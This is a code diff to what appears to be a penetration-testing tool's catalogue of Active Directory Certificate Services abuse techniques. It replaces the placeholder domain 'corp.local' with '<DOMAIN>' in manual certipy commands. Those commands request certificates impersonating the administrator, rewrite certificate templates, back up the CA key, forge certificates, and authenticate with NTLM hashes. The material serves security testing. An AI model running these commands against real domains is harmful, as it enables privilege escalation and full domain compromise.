@@ -24,8 +24,8 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         mitre_id="T1649",
         summary="Template allows requesting a cert for arbitrary SAN + client authentication EKU.",
         manual_commands=(
-            "certipy req -u user@corp.local -p pass -ca <CA> -template <Template> "
-            "-upn administrator@corp.local",
+            "certipy req -u user@<DOMAIN> -p pass -ca <CA> -template <Template> "
+            "-upn administrator@<DOMAIN>",
             "certipy auth -pfx administrator.pfx -dc-ip <DC>",
         ),
     ),
@@ -55,9 +55,9 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         mitre_id="T1649",
         summary="Write access on certificate template enables ESC1-style abuse.",
         manual_commands=(
-            "certipy template -u user@corp.local -hashes :<NTLM> -template <Template> -save-old",
-            "certipy template -u user@corp.local -hashes :<NTLM> -template <Template> -add-client-auth",
-            "certipy req -ca <CA> -template <Template> -upn administrator@corp.local",
+            "certipy template -u user@<DOMAIN> -hashes :<NTLM> -template <Template> -save-old",
+            "certipy template -u user@<DOMAIN> -hashes :<NTLM> -template <Template> -add-client-auth",
+            "certipy req -ca <CA> -template <Template> -upn administrator@<DOMAIN>",
             "certipy auth -pfx administrator.pfx -dc-ip <DC>",
         ),
     ),
@@ -69,7 +69,7 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         summary="CA allows requester to specify SAN in any template issued by this CA.",
         manual_commands=(
             "certipy req -u user -p pass -ca <CA> -template User "
-            "-upn administrator@corp.local",
+            "-upn administrator@<DOMAIN>",
         ),
     ),
     "esc7": EscTechnique(
@@ -118,9 +118,9 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         mitre_id="T1649",
         summary="Template omits szOID_NTDS_CA_SECURITY_EXT — with weak mapping (StrongCertificateBindingEnforcement=0), GenericWrite enables UPN spoofing.",
         manual_commands=(
-            "certipy shadow auto -u user@corp.local -p pass -account <target>",
-            "certipy req -u <target>@corp.local -hashes :<hash> -ca <CA> "
-            "-template <Template> -upn administrator@corp.local",
+            "certipy shadow auto -u user@<DOMAIN> -p pass -account <target>",
+            "certipy req -u <target>@<DOMAIN> -hashes :<hash> -ca <CA> "
+            "-template <Template> -upn administrator@<DOMAIN>",
             "certipy auth -pfx administrator.pfx -dc-ip <DC>",
         ),
     ),
@@ -131,8 +131,8 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         mitre_id="T1649",
         summary="Registry CertificateMappingMethods allows UPN-only mapping — UPN change + cert enrollment = impersonation.",
         manual_commands=(
-            "# Change target's UPN to administrator@corp.local",
-            "certipy req -u <target>@corp.local -hashes :<hash> -ca <CA> -template <Template>",
+            "# Change target's UPN to administrator@<DOMAIN>",
+            "certipy req -u <target>@<DOMAIN> -hashes :<hash> -ca <CA> -template <Template>",
             "# Restore UPN, then auth with cert",
             "certipy auth -pfx administrator.pfx -dc-ip <DC>",
         ),
@@ -157,7 +157,7 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         mitre_id="T1649",
         summary="Certificate template with issuance policy OID linked to a group via msDS-OIDToGroupLink — enrollment grants effective group membership.",
         manual_commands=(
-            "certipy req -u user@corp.local -p pass -ca <CA> -template <Template>",
+            "certipy req -u user@<DOMAIN> -p pass -ca <CA> -template <Template>",
             "certipy auth -pfx <user>.pfx -dc-ip <DC>",
         ),
     ),
@@ -169,7 +169,7 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         summary="Explicit altSecurityIdentities mapping on user objects — writable entries enable cert-based impersonation.",
         manual_commands=(
             "# Modify altSecurityIdentities on target to map attacker's cert",
-            "certipy req -u user@corp.local -p pass -ca <CA> -template <Template>",
+            "certipy req -u user@<DOMAIN> -p pass -ca <CA> -template <Template>",
             "certipy auth -pfx <user>.pfx -dc-ip <DC>",
         ),
     ),
@@ -181,7 +181,7 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         summary="Forge TGTs with stolen CA private key (NTAUTH certificate).",
         manual_commands=(
             "certipy ca -backup -ca <CA>",
-            "certipy forge -ca-pfx ca.pfx -upn administrator@corp.local",
+            "certipy forge -ca-pfx ca.pfx -upn administrator@<DOMAIN>",
         ),
         guide_key="golden_cert",
     ),
@@ -192,8 +192,8 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         mitre_id="T1649",
         summary="Owned principal can enroll in a non-default template (e.g. via group membership).",
         manual_commands=(
-            "certipy find -u user@corp.local -hashes :<NTLM> -dc-ip <DC> -vulnerable",
-            "certipy req -u user@corp.local -hashes :<NTLM> -ca <CA> -template <Template> -dns <target>",
+            "certipy find -u user@<DOMAIN> -hashes :<NTLM> -dc-ip <DC> -vulnerable",
+            "certipy req -u user@<DOMAIN> -hashes :<NTLM> -ca <CA> -template <Template> -dns <target>",
             "certipy auth -pfx <host>.pfx -dc-ip <DC>",
         ),
     ),
